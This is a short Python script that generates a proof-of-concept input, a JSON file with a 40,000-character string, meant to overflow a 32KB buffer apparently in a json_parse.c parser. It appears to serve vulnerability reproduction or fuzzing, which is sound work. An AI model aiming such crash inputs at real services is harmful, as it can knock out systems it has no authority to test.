import os
import sys

def generate_poc(filename="manual_seed.json"):
    # The vulnerability is triggered when input exceeds the 32KB buffer in json_parse.c
    # We create a simple JSON with a string large enough to cross the 32768 boundary.
    # 40000 bytes is comfortably larger than 32768.
    
    payload_content = "A" * 40000
    json_content = '{"key": "' + payload_content + '"}'
    
    with open(filename, "w") as f:
        f.write(json_content)
    
    print(f"Generated {filename} with size {len(json_content)} bytes (Flat JSON, large string)")

if __name__ == "__main__":
    generate_poc()
